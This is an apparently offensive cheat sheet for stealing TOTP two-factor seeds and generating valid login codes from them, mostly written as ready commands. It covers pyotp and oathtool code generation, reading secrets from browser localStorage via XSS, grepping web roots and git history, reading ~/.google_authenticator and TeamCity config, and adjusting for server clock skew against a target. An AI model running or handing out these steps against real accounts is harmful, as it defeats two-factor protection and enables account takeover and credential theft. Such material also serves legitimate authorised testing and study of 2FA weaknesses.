# TOTP 2FA Secret Theft + Code Generation

If you find a TOTP secret (base32 seed) — in source code, config files, backups, browser local storage, `.google_authenticator`, or secrets manager — generate valid codes without the authenticator app.

```bash
# Generate current TOTP code from secret (Python)
python3 -c "
import pyotp, sys
secret = sys.argv[1]  # base32 string, e.g. 'JBSWY3DPEHPK3PXP'
totp = pyotp.TOTP(secret)
print(totp.now())
" '<SECRET>'

# OR: oathtool
oathtool --totp --base32 '<SECRET>'

# One-liner loop (codes change every 30s):
watch -n 1 "oathtool --totp --base32 '<SECRET>'"
```

## Finding TOTP secrets

```bash
# Browser localStorage (from XSS or JS source)
localStorage.getItem('totp_secret')

# Config / source files
grep -r 'secret\|totp\|authenticator\|2fa' /var/www/ --include="*.php" --include="*.js" -l

# TeamCity / CI - check build configurations and versioned settings in Git
git log --all -p | grep -i 'secret\|totp'
# TeamCity stores OAuth tokens and secrets in <TeamCity_Data_Dir>/config/

# .google_authenticator file (per-user PAM TOTP)
cat ~/.google_authenticator  # first line is the base32 secret
```

## Bypass TOTP when clock skew is large

TOTP has a ±1 window (30s before/after). If server time differs significantly:
```bash
# Check server time from NTP or HTTP Date header
curl -sI http://<TARGET>/ | grep Date
# Adjust: pyotp.TOTP(secret).at(time.time() + skew_seconds)
```
